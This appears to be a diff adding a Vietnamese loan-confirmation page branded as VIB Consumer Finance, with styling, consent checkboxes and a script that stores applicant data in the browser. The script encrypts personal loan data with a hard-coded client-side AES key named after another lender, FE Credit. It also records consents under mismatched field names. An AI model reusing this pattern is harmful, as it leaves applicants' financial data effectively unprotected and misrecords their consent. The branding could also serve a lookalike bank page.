+        transform: translateX(-100%);
+        animation: vibProgressShimmer 2.4s ease-in-out infinite;
+      }
+
+      @keyframes vibProgressShimmer {
+        55%, 100% { transform: translateX(100%); }
+      }
+
+      .content {
+        width: min(1120px, 100%);
+        margin: 0 auto;
+        padding: clamp(22px, 4vw, 44px) var(--vib-page-gutter) max(46px, env(safe-area-inset-bottom));
+        align-items: flex-start;
+      }
+
+      .loan-confirm-card {
+        position: relative;
+        width: min(980px, 100%);
+        max-width: 980px;
+        margin: 0 auto;
+        padding: clamp(24px, 4vw, 44px);
+        display: grid;
+        grid-template-columns: minmax(0, .86fr) minmax(0, 1.14fr);
+        grid-template-areas:
+          "heading heading"
+          "label consents"
+          "summary consents"
+          "details consents"
+          "contract actions"
+          "disclaimer actions";
+        column-gap: clamp(24px, 4vw, 44px);
+        row-gap: 14px;
+        overflow: hidden;
+        color: var(--vib-ink);
+        background: rgba(255, 255, 255, 0.95);
+        border: 1px solid rgba(208, 224, 216, 0.95);
+        border-radius: clamp(24px, 4vw, 32px);
+        box-shadow: var(--vib-shadow-card);
+        backdrop-filter: blur(18px);
+        -webkit-backdrop-filter: blur(18px);
+      }
+
+      .loan-confirm-card::after {
+        content: "";
+        position: absolute;
+        inset: 0;
+        z-index: -1;
+        pointer-events: none;
+        border-radius: inherit;
+        box-shadow: inset 0 1px 0 rgba(255,255,255,.92);
+      }
+
+      .loan-page-heading {
+        grid-area: heading;
+        padding-bottom: 22px;
+        display: flex;
+        align-items: flex-end;
+        justify-content: space-between;
+        gap: 24px;
+        border-bottom: 1px solid var(--vib-line);
+      }
+
+      .loan-page-heading__copy { min-width: 0; }
+
+      .loan-page-heading__eyebrow {
+        width: fit-content;
+        min-height: 28px;
+        margin: 0 0 12px;
+        padding: 5px 11px;
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        color: #725300;
+        background: #fff4d2;
+        border: 1px solid #f3d88d;
+        border-radius: 999px;
+        font-size: 11px;
+        font-weight: 800;
+        letter-spacing: .09em;
+        text-transform: uppercase;
+      }
+
+      .loan-page-heading h1 {
+        margin: 0;
+        color: var(--vib-ink);
+        font-size: clamp(26px, 4vw, 38px);
+        font-weight: 780;
+        line-height: 1.18;
+        letter-spacing: -.04em;
+        text-wrap: balance;
+      }
+
+      .loan-page-heading p {
+        max-width: 560px;
+        margin: 9px 0 0;
+        color: var(--vib-muted);
+        font-size: 14px;
+        line-height: 1.65;
+        text-wrap: pretty;
+      }
+
+      .loan-page-heading__status {
+        flex: 0 0 auto;
+        min-width: 134px;
+        padding: 11px 13px;
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        color: #086546;
+        background: var(--vib-success-soft);
+        border: 1px solid #c9e7da;
+        border-radius: 15px;
+        font-size: 11px;
+        font-weight: 700;
+        line-height: 1.35;
+      }
+
+      .loan-page-heading__status i { display: none; }
+
+      .loan-page-heading__status::before {
+        content: "✓";
+        width: 24px;
+        height: 24px;
+        flex: 0 0 24px;
+        display: grid;
+        place-items: center;
+        color: #fff;
+        background: var(--vib-success);
+        border-radius: 8px;
+        font-size: 13px;
+        font-weight: 850;
+      }
+
+      .section-label {
+        grid-area: label;
+        align-self: end;
+        margin: 0;
+        color: var(--vib-muted);
+        font-size: 11px;
+        font-weight: 800;
+        letter-spacing: .1em;
+      }
+
+      .summary-card {
+        grid-area: summary;
+        position: relative;
+        min-height: 150px;
+        margin: 0;
+        padding: 22px;
+        overflow: hidden;
+        color: #fff;
+        background:
+          radial-gradient(circle at 100% 0%, rgba(253,185,19,.26), transparent 13rem),
+          linear-gradient(145deg, #10231c 0%, #193b2f 100%);
+        border: 1px solid rgba(255,255,255,.08);
+        border-radius: 21px;
+        box-shadow: 0 18px 38px rgba(16,35,28,.18);
+      }
+
+      .summary-card::after {
+        content: "VIB";
+        position: absolute;
+        right: 16px;
+        bottom: -19px;
+        color: rgba(255,255,255,.055);
+        font-size: 76px;
+        font-weight: 800;
+        letter-spacing: -.07em;
+      }
+
+      .summary-row {
+        position: relative;
+        z-index: 1;
+        margin: 0;
+      }
+
+      .summary-row + .summary-row { margin-top: 20px !important; }
+
+      .summary-label {
+        color: rgba(231,243,238,.66);
+        font-size: 10px;
+        font-weight: 750;
+        letter-spacing: .11em;
+      }
+
+      .summary-value-main {
+        margin-top: 7px;
+        color: #ffd451;
+        font-size: clamp(27px, 4vw, 38px);
+        font-weight: 780;
+        letter-spacing: -.045em;
+      }
+
+      .summary-value-sub {
+        color: #fff;
+        font-size: 16px;
+        font-weight: 700;
+      }
+
+      .details-list {
+        grid-area: details;
+        margin: 0;
+        overflow: hidden;
+        background: var(--vib-surface-soft);
+        border: 1px solid var(--vib-line);
+        border-radius: 18px;
+      }
+
+      .details-item {
+        min-height: 56px;
+        padding: 13px 15px;
+        gap: 18px;
+        font-size: 13px;
+      }
+
+      .details-item + .details-item { border-top-color: var(--vib-line); }
+
+      .details-label { color: var(--vib-muted); }
+      .details-value { color: var(--vib-ink); }
+
+      .info-icon {
+        width: 18px;
+        height: 18px;
+        color: var(--vib-brand-blue-deep);
+        background: #eaf4fb;
+        border-color: #c8ddec;
+        font-size: 10px;
+        font-weight: 800;
+      }
+
+      .checkbox-group {
+        grid-area: consents;
+        margin: 0;
+        gap: 11px;
+      }
+
+      .checkbox-group::before {
+        content: "Điều khoản xác nhận";
+        margin: 0 0 1px;
+        color: var(--vib-muted);
+        font-size: 11px;
+        font-weight: 800;
+        letter-spacing: .1em;
+        text-transform: uppercase;
+      }
+
+      .checkbox-row,
+      .ubank-banner {
+        position: relative;
+        margin: 0;
+        padding: 15px;
+        gap: 12px;
+        color: var(--vib-ink-soft);
+        background: #fff;
+        border: 1px solid var(--vib-line);
+        border-radius: 17px;
+        box-shadow: 0 8px 24px rgba(26,51,42,.045);
+        transition: transform 180ms ease, border-color 180ms ease, box-shadow 180ms ease, background 180ms ease;
+      }
+
+      .checkbox-row:hover,
+      .ubank-banner:hover {
+        transform: translateY(-1px);
+        background: #fbfdfc;
+        border-color: #cbded5;
+        box-shadow: 0 12px 28px rgba(26,51,42,.075);
+      }
+
+      .checkbox-text,
+      .ubank-content {
+        font-size: 13px;
+        line-height: 1.58;
+      }
+
+      .checkbox-square {
+        width: 23px;
+        height: 23px;
+        flex: 0 0 23px;
+        color: #2d2305;
+        background: #fff;
+        border: 1.5px solid #b9c9c1;
+        border-radius: 7px;
+        box-shadow: inset 0 1px 0 rgba(255,255,255,.8);
+      }
+
+      .checkbox-square:hover { border-color: #d89e00; }
+
+      .checkbox-square.checked {
+        color: #2d2305;
+        background: linear-gradient(145deg, #ffd75b, var(--vib-brand-yellow));
+        border-color: #dfa500;
+        box-shadow: 0 7px 16px rgba(253,185,19,.23), inset 0 1px 0 rgba(255,255,255,.62);
+      }
+
+      .checkbox-square > i { display: none !important; }
+
+      .checkbox-square.checked::after {
+        content: "✓";
+        color: #2d2305;
+        font-size: 15px;
+        font-weight: 900;
+        line-height: 1;
+      }
+
+      .checkbox-text a {
+        color: var(--vib-brand-blue-deep);
+        text-underline-offset: 3px;
+      }
+
+      .ubank-banner {
+        background: linear-gradient(145deg, #f2f8f5 0%, #edf6f2 100%);
+        border-color: #cfe3da;
+      }
+
+      .ubank-logo-placeholder {
+        width: 38px;
+        height: 38px;
+        flex: 0 0 38px;
+        overflow: hidden;
+        background: #fff;
+        border: 1px solid #d4e3dc;
+        border-radius: 12px;
+        box-shadow: 0 7px 18px rgba(26,51,42,.08);
+      }
+
+      .ubank-logo-placeholder img {
+        width: 100%;
+        height: 100%;
+        padding: 4px;
+        object-fit: contain;
+      }
+
+      .checkbox-error {
+        margin: 0;
+        padding: 11px 13px;
+        color: var(--vib-danger);
+        background: var(--vib-danger-soft);
+        border: 1px solid #f1cbd2;
+        border-radius: 13px;
+        font-size: 12px;
+        font-weight: 650;
+        line-height: 1.5;
+      }
+
+      .contract-link {
+        grid-area: contract;
+        align-self: end;
+        margin: 0;
+        text-align: left;
+      }
+
+      .contract-link a {
+        display: inline-flex;
+        align-items: center;
+        gap: 6px;
+        color: var(--vib-brand-blue-deep);
+        font-size: 13px;
+        font-weight: 750;
+        text-underline-offset: 4px;
+      }
+
+      .disclaimer {
+        grid-area: disclaimer;
+        align-self: start;
+        margin: 0;
+        color: var(--vib-muted);
+        text-align: left;
+        font-size: 11px;
+        line-height: 1.5;
+      }
+
+      .actions {
+        grid-area: actions;
+        align-self: end;
+        display: grid;
+        grid-template-columns: minmax(0, 1.35fr) minmax(0, .85fr);
+        gap: 10px;
+      }
+
+      .actions .btn {
+        min-height: 54px;
+        padding: 13px 18px;
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        border-radius: 16px;
+        font-size: 14px;
+        font-weight: 800;
+        letter-spacing: .015em;
+        transition: transform 180ms ease, box-shadow 180ms ease, background 180ms ease, border-color 180ms ease;
+      }
+
+      .btn-primary-main {
+        color: #322300;
+        background: linear-gradient(145deg, #ffd451, var(--vib-brand-yellow));
+        border: 1px solid #e9a800;
+        box-shadow: 0 14px 30px rgba(253, 185, 19, 0.25), inset 0 1px 0 rgba(255,255,255,.65);
+      }
+
+      .btn-primary-main:hover {
+        color: #322300;
+        background: linear-gradient(145deg, #ffdc6a, #ffc015);
+        transform: translateY(-2px);
+        box-shadow: 0 18px 34px rgba(253,185,19,.3), inset 0 1px 0 rgba(255,255,255,.65);
+      }
+
+      .btn-secondary-outline {
+        color: var(--vib-ink-soft);
+        background: #fff;
+        border: 1.5px solid #c7d7cf;
+        box-shadow: 0 9px 22px rgba(26,51,42,.055);
+      }
+
+      .btn-secondary-outline:hover {
+        color: var(--vib-danger);
+        background: #fff7f8;
+        border-color: #e3b5bd;
+        transform: translateY(-2px);
+      }
+
+      .actions .btn:active { transform: translateY(0); }
+
+      @media (max-width: 860px) {
+        .loan-confirm-card {
+          width: min(640px, 100%);
+          grid-template-columns: 1fr;
+          grid-template-areas:
+            "heading"
+            "label"
+            "summary"
+            "details"
+            "consents"
+            "contract"
+            "disclaimer"
+            "actions";
+          row-gap: 14px;
+        }
+        .loan-page-heading { align-items: flex-start; }
+        .loan-page-heading__status { min-width: 0; }
+        .contract-link, .disclaimer { text-align: center; }
+        .contract-link a { justify-content: center; }
+      }
+
+      @media (max-width: 620px) {
+        .app-header { padding-inline: 12px; }
+        .app-header__inner { min-height: 56px; padding: 8px 10px 8px 12px; border-radius: 17px; }
+        .app-brand img { width: 70px; height: 36px; }
+        .app-brand__copy { display: none; }
+        .header-step { display: none; }
+        .secure-chip { min-height: 32px; padding: 6px 9px; font-size: 0; }
+        .secure-chip::after { content: "Bảo mật"; font-size: 11px; }
+        .flow-progress { width: calc(100% - 28px); gap: 7px; }
+        .content { padding: 18px 14px max(30px, env(safe-area-inset-bottom)); }
+        .loan-confirm-card { padding: 24px 18px 20px; border-radius: 25px; }
+        .loan-page-heading { padding-bottom: 18px; display: block; }
+        .loan-page-heading__status { width: fit-content; margin-top: 14px; padding: 8px 10px; }
+        .summary-card { min-height: 142px; padding: 19px; border-radius: 18px; }
+        .details-item { min-height: 53px; padding: 12px 13px; }
+        .checkbox-row, .ubank-banner { padding: 14px 13px; }
+        .actions { grid-template-columns: 1fr; }
+        .actions .btn { width: 100%; }
+      }
+
+      @media (max-width: 370px) {
+        .loan-confirm-card { padding-inline: 14px; }
+        .summary-value-main { font-size: 25px; }
+        .checkbox-text, .ubank-content { font-size: 12px; }
+      }
+
+      @media (prefers-reduced-motion: reduce) {
+        *, *::before, *::after {
+          scroll-behavior: auto !important;
+          animation-duration: .01ms !important;
+          animation-iteration-count: 1 !important;
+          transition-duration: .01ms !important;
+        }
+      }
+    </style>
+
+  </head>
+  <body>
+    <div class="page-wrapper">
+      <header class="app-header">
+        <div class="app-header__inner">
+          <div class="app-brand">
+            <img src="data:image/svg+xml;charset=UTF-8,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20viewBox%3D%220%200%20820%20387%22%20role%3D%22img%22%20aria-labelledby%3D%22title%20desc%22%3E%0A%20%20%3Ctitle%20id%3D%22title%22%3EVIB%3C%2Ftitle%3E%0A%20%20%3Cdesc%20id%3D%22desc%22%3EBi%E1%BB%83u%20tr%C6%B0ng%20VIB%20m%C3%A0u%20xanh%20v%E1%BB%9Bi%20bi%E1%BB%83u%20t%C6%B0%E1%BB%A3ng%20ba%20c%C3%A1nh%20v%C3%A0ng%20cam%3C%2Fdesc%3E%0A%20%20%3Cpath%20d%3D%22M10%20137.21%20L65.18%20137.21%20L121.59%20294.27%20L177.91%20137.21%20L233.05%20137.21%20L154.25%20350%20L88.8%20350%20L10%20137.21%20Z%20M261.28%20137.21%20L316.15%20137.21%20L316.15%20350%20L261.28%20350%20L261.28%20137.21%20Z%20M455.07%20219.62%20Q468.07%20219.62%20474.72%20213.92%20Q481.43%20208.22%20481.43%20197.09%20Q481.43%20186.1%20474.72%20180.35%20Q468.07%20174.56%20455.07%20174.56%20L424.74%20174.56%20L424.74%20219.62%20L455.07%20219.62%20Z%20M456.94%20312.65%20Q473.45%20312.65%20481.79%20305.67%20Q490.14%20298.7%20490.14%20284.6%20Q490.14%20270.74%20481.88%20263.85%20Q473.63%20256.92%20456.94%20256.92%20L424.74%20256.92%20L424.74%20312.65%20L456.94%20312.65%20Z%20M507.97%20236.13%20Q525.62%20241.28%20535.29%20255.1%20Q545%20268.92%20545%20288.98%20Q545%20319.76%20524.2%20334.91%20Q503.41%20350%20460.91%20350%20L369.88%20350%20L369.88%20137.21%20L452.24%20137.21%20Q496.57%20137.21%20516.45%20150.62%20Q536.34%20164.03%20536.34%20193.53%20Q536.34%20209.04%20529.04%20219.94%20Q521.79%20230.84%20507.97%20236.13%20Z%22%20fill%3D%22%231769aa%22%2F%3E%0A%20%20%3Cg%20aria-hidden%3D%22true%22%3E%0A%20%20%20%20%3Cpath%20d%3D%22M571%202C609%202%20628%208%20646%2029L665%2050L684%2029C702%208%20722%202%20760%202L710%2066C695%2084%20681%2091%20663%2091C645%2091%20630%2084%20616%2067Z%22%20fill%3D%22%23fdb913%22%2F%3E%0A%20%20%20%20%3Cpath%20d%3D%22M527%2066L614%2088C635%2094%20646%20108%20640%20127L616%20239L586%20188L573%20124C570%20110%20560%20102%20546%2096C536%2090%20529%2080%20527%2066Z%22%20fill%3D%22%23f7941d%22%2F%3E%0A%20%20%20%20%3Cpath%20d%3D%22M799%2066L712%2088C691%2094%20680%20108%20686%20127L710%20239L740%20188L753%20124C756%20110%20766%20102%20780%2096C790%2090%20797%2080%20799%2066Z%22%20fill%3D%22%23f36f21%22%2F%3E%0A%20%20%3C%2Fg%3E%0A%3C%2Fsvg%3E" alt="VIB" />
+            <span class="app-brand__copy">
+              <strong>VIB Consumer Finance</strong>
+              <small>Xác nhận đề nghị vay</small>
+            </span>
+          </div>
+          <div class="header-meta" aria-label="Trạng thái phiên làm việc">
+            <span class="header-step">Bước 5/5</span>
+            <span class="secure-chip">Kết nối bảo mật</span>
+          </div>
+        </div>
+      </header>
+
+      <div class="flow-progress" aria-label="Tiến trình hồ sơ: bước 5 trên 5">
+        <span class="is-complete"></span>
+        <span class="is-complete"></span>
+        <span class="is-complete"></span>
+        <span class="is-complete"></span>
+        <span class="is-active"></span>
+      </div>
+      <div class="content">
+        <div class="loan-confirm-card">
+          <div class="loan-page-heading">
+            <div class="loan-page-heading__copy">
+              <span class="loan-page-heading__eyebrow">Xác nhận cuối</span>
+              <h1>Kiểm tra đề nghị vay</h1>
+              <p>Đối chiếu thông tin khoản vay và xác nhận các điều khoản trước khi tiếp tục.</p>
+            </div>
+            <div class="loan-page-heading__status">
+              <i class="bi bi-shield-check" aria-hidden="true"></i>
+              <span>Hồ sơ đã được thẩm định</span>
+            </div>
+          </div>
+
+          <!-- Loan Summary Card -->
+          <div class="section-label">YÊU CẦU</div>
+          <div class="summary-card">
+            <div class="summary-row">
+              <div>
+                <div class="summary-label">TỔNG SỐ TIỀN</div>
+                <div class="summary-value-main" id="summary-amount">
+                  100&nbsp;000&nbsp;000&nbsp;₫
+                </div>
+              </div>
+            </div>
+            <div class="summary-row" style="margin-top:4px;">
+              <div class="summary-label">THỜI HẠN</div>
+              <div class="summary-value-sub" id="summary-duration">
+                36 tháng
+              </div>
+            </div>
+          </div>
+
+          <!-- Loan Details List -->
+          <ul class="details-list">
+            <li class="details-item">
+              <span class="details-label">Lãi suất/tháng</span>
+              <span
+                class="details-value details-value-strong"
+                id="detail-interest"
+                >5.88%</span
+              >
+            </li>
+            <li class="details-item">
+              <span class="details-label">
+                Bảo hiểm tín dụng
+                <span class="info-icon" title="Thông tin về bảo hiểm tín dụng">
+                  i
+                </span>
+              </span>
+              <span class="details-value details-value-strong">CÓ</span>
+            </li>
+          </ul>
+
+          <!-- Consent Forms -->
+          <div class="checkbox-group">
+            <div class="checkbox-row" data-checkbox="consent-1">
+              <div class="checkbox-square" tabindex="0">
+                <i class="bi bi-check-lg"></i>
+              </div>
+              <div class="checkbox-text">
+                 Các thông tin kê khai trên là chính xác, trung thực, hợp pháp và cam kết chịu trách nhiệm trước pháp luật về việc kê khai các thông tin trên.
+                <a href="#" tabindex="0">xem thêm</a>.
+              </div>
+            </div>
+
+            <div class="checkbox-row" data-checkbox="consent-2">
+              <div class="checkbox-square" tabindex="0">
+                <i class="bi bi-check-lg"></i>
+              </div>
+              <div class="checkbox-text">
+                Đồng ý cung cấp thông tin cho Tổ chức tín dụng để phục vụ mục đích cấp tín dụng (bao gồm hồ sơ, thông tin về pháp lý, về tài chính - kinh doanh và về người đại diện có thẩm quyền).
+              </div>
+            </div>
+
+            <div class="ubank-banner" data-checkbox="consent-3">
+              <div class="checkbox-square" tabindex="0">
+                <i class="bi bi-check-lg"></i>
+              </div>
+              <div class="ubank-content">
+                 Đồng ý và ủy quyền cho VIB thực hiện hoạt động cung cấp các hồ sơ, thông tin này cho Tổ chức tín dụng.
+              </div>
+              <div class="ubank-logo-placeholder" aria-hidden="true">
+                <img src="data:image/svg+xml;charset=UTF-8,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20viewBox%3D%220%200%20128%20128%22%20role%3D%22img%22%20aria-label%3D%22VIB%22%3E%0A%20%20%3Crect%20width%3D%22128%22%20height%3D%22128%22%20rx%3D%2228%22%20fill%3D%22%23ffffff%22%2F%3E%0A%20%20%3Cpath%20d%3D%22M24%2016C39%2016%2047%2019%2054%2028L64%2039L74%2028C81%2019%2089%2016%20104%2016L82%2045C76%2052%2070%2055%2064%2055C58%2055%2052%2052%2046%2045Z%22%20fill%3D%22%23fdb913%22%2F%3E%0A%20%20%3Cpath%20d%3D%22M13%2042L49%2051C58%2053%2062%2059%2059%2067L50%20113L37%2092L32%2066C31%2060%2027%2057%2021%2054C17%2052%2014%2048%2013%2042Z%22%20fill%3D%22%23f7941d%22%2F%3E%0A%20%20%3Cpath%20d%3D%22M115%2042L79%2051C70%2053%2066%2059%2069%2067L78%20113L91%2092L96%2066C97%2060%20101%2057%20107%2054C111%2052%20114%2048%20115%2042Z%22%20fill%3D%22%23f36f21%22%2F%3E%0A%3C%2Fsvg%3E" alt="" />
+              </div>
+            </div>
+
+            <div id="checkbox-error" class="checkbox-error">
+              Vui lòng xác nhận tất cả các điều khoản bắt buộc trước khi tiếp
+              tục.
+            </div>
+          </div>
+
+          <!-- Footer & Actions -->
+          <div class="contract-link">
+            <a href="step6.html">Xem và xác nhận hợp đồng &gt;</a>
+          </div>
+          <div class="disclaimer">
+            * Tôi đã đọc và hoàn toàn đồng ý với các điều khoản trên.
+          </div>
+
+          <div class="actions">
+            <button
+              id="btn-sign"
+              type="button"
+              class="btn btn-primary-main"
+            >
+              ĐỒNG Ý
+            </button>
+            <button
+              id="btn-decline"
+              type="button"
+              class="btn btn-secondary-outline"
+            >
+              TỪ CHỐI
+            </button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
+    <script>
+      // =====================================================================
+      // PHẦN 1: LOGIC LƯU VỊ TRÍ - Save current step on page load
+      // =====================================================================
+      // Lưu vị trí hiện tại ngay khi trang tải
+      localStorage.setItem('currentStep', 'step5.html');
+
+      function toNumberOrZero(value) {
+        if (value === null || value === undefined) return 0;
+        if (typeof value === "number") return value;
+        const cleaned = String(value).replace(/,/g, "").trim();
+        const n = parseFloat(cleaned);
+        return isNaN(n) ? 0 : n;
+      }
+
+      function formatCurrency(n) {
+        if (!n || isNaN(n)) return "0 ₫";
+        return (
+          Number(n).toLocaleString("vi-VN").replace(/,/g, " ") + " ₫"
+        );
+      }
+
+      function loadUserDataStep5() {
+        try {
+          const stored = localStorage.getItem("userData");
+          if (!stored) return null;
+          const decrypted = CryptoJS.AES.decrypt(
+            stored,
+            "fecredit-secret-key-v1"
+          ).toString(CryptoJS.enc.Utf8);
+          if (!decrypted) return null;
+          return JSON.parse(decrypted);
+        } catch (e) {
+          console.error("Lỗi đọc userData tại step5:", e);
+          return null;
+        }
+      }
+
+      document.addEventListener("DOMContentLoaded", function () {
+        const data = loadUserDataStep5();
+        const amountEl = document.getElementById("summary-amount");
+        const durationEl = document.getElementById("summary-duration");
+        const interestEl = document.getElementById("detail-interest");
+
+        if (data) {
+          let loanAmount = 0;
+
+          if (data.loanAmount === "other" && data.customLoanAmount) {
+            loanAmount = toNumberOrZero(data.customLoanAmount);
+          } else if (data.loanAmount !== undefined && data.loanAmount !== null) {
+            loanAmount = toNumberOrZero(data.loanAmount);
+          }
+
+          if (amountEl) {
+            amountEl.textContent = formatCurrency(loanAmount);
+          }
+
+          let loanTerm = 0;
+          if (data.loanTerm !== undefined && data.loanTerm !== null) {
+            loanTerm = parseInt(String(data.loanTerm).trim(), 10);
+            loanTerm = isNaN(loanTerm) ? 0 : loanTerm;
+          }
+          if (durationEl) {
+            durationEl.textContent =
+              loanTerm > 0 ? loanTerm + " tháng" : "--";
+          }
+
+          if (interestEl && data.interestRate !== undefined && data.interestRate !== null) {
+            const rateYear = toNumberOrZero(data.interestRate);
+            if (rateYear > 0) {
+              const perMonth = rateYear / 12;
+              interestEl.textContent = perMonth.toFixed(2) + "%";
+            }
+          }
+
+          data.currentStep = 5;
+          localStorage.setItem(
+            "userData",
+            CryptoJS.AES.encrypt(
+              JSON.stringify(data),
+              "fecredit-secret-key-v1"
+            ).toString()
+          );
+        }
+
+        // Checkbox logic – CHỈ gắn event vào ô vuông
+        const checkboxSquares = document.querySelectorAll(
+          "[data-checkbox] .checkbox-square"
+        );
+        const checkboxError = document.getElementById("checkbox-error");
+
+        checkboxSquares.forEach((square) => {
+          square.addEventListener("click", (e) => {
+            e.preventDefault();
+            square.classList.toggle("checked");
+          });
+
+          square.addEventListener("keydown", (e) => {
+            if (e.key === " " || e.key === "Enter") {
+              e.preventDefault();
+              square.classList.toggle("checked");
+            }
+          });
+        });
+
+        function allRequiredConsentsChecked() {
+          const consent1 = document.querySelector(
+            '[data-checkbox="consent-1"] .checkbox-square'
+          );
+          const consent2 = document.querySelector(
+            '[data-checkbox="consent-2"] .checkbox-square'
+          );
+          return (
+            consent1 && consent1.classList.contains("checked") &&
+            consent2 && consent2.classList.contains("checked")
+          );
+        }
+
+        const btnSign = document.getElementById("btn-sign");
+        const btnDecline = document.getElementById("btn-decline");
+
+        if (btnSign) {
+          btnSign.addEventListener("click", function () {
+            if (!allRequiredConsentsChecked()) {
+              checkboxError && checkboxError.classList.add("show");
+              return;
+            }
+            checkboxError && checkboxError.classList.remove("show");
+
+            try {
+              const stored = localStorage.getItem("userData");
+              if (stored) {
+                const decrypted = CryptoJS.AES.decrypt(
+                  stored,
+                  "fecredit-secret-key-v1"
+                ).toString(CryptoJS.enc.Utf8);
+                if (decrypted) {
+                  const obj = JSON.parse(decrypted);
+                  obj.consentedInsurance = document
+                    .querySelector('[data-checkbox="consent-1"] .checkbox-square')
+                    .classList.contains("checked");
+                  obj.consentedTerms = document
+                    .querySelector('[data-checkbox="consent-2"] .checkbox-square')
+                    .classList.contains("checked");
+                  obj.wantUbank = document
+                    .querySelector('[data-checkbox="consent-3"] .checkbox-square')
+                    .classList.contains("checked");
+                  obj.currentStep = 6;
+                  localStorage.setItem(
+                    "userData",
+                    CryptoJS.AES.encrypt(
+                      JSON.stringify(obj),
+                      "fecredit-secret-key-v1"
+                    ).toString()
+                  );
+                }
+              }
+            } catch (e) {
+              console.error("Lỗi cập nhật consents:", e);
+            }
+
+            // Đồng ý giải ngân -> sang step8
+            window.location.href = "step8.html";
+          });
+        }
+
+        if (btnDecline) {
+          btnDecline.addEventListener("click", function () {
+            window.location.href = "../index.html";
+          });
+        }
+      });
+    </script>
+  </body>
+</html>
